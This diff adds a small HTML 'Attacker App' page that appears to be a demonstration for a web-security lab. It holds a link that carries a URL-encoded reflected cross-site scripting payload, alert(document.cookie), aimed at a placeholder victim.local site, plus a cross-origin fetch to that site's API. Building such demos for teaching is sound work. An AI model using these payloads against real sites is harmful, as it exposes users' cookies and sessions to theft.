@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attacker App</title>
+  </head>
+  <body>
+    <h1>Attacker App</h1>
+    <a href="https://victim.local/">Victim App</a>
+    <br />
+    <a
+      href="https://victim.local/?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+      >Exploit Victim App</a
+    >
+    <br />
+    <img src="https://victim.local/image.jpg" alt="Image" />
+
+    <script>
+      fetch("https://victim.local/api/get");
+    </script>
+  </body>
+</html>
